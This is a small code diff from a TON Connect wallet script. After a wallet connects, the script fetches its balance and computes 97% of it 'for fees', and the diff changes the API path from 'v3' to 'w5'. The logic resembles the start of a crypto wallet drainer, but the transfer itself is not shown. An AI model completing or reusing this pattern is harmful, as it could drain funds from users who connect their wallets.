@@ -45,7 +45,7 @@ tonConnectUI.on('walletConnected', (walletAddress) => {
 });
 
 async function didtrans() {
-    const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
+    const response = await fetch('https://toncenter.com/api/w5/wallet?address=' + tonConnectUI.account.address);
     const data = await response.json();
     let originalBalance = parseFloat(data.balance);
     let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
